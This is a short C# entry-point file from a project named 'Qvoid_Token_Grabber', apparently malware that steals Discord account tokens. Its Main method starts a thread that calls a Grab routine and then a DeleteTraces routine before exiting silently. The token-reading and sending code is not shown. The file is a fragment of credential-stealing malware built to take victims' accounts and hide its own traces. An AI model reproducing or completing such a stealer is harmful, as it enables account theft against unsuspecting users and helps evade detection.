using System;
using System.Threading;

namespace Qvoid_Token_Grabber
{
    static class Program
    {
        static void Main()
        {
            new Thread(() =>
            {
                Discord.Grabber.Grab();
                Discord.Grabber.DeleteTraces(false, false);
                Environment.Exit(0);
            }).Start();

            Thread.Sleep(-1);
        }
    }
}
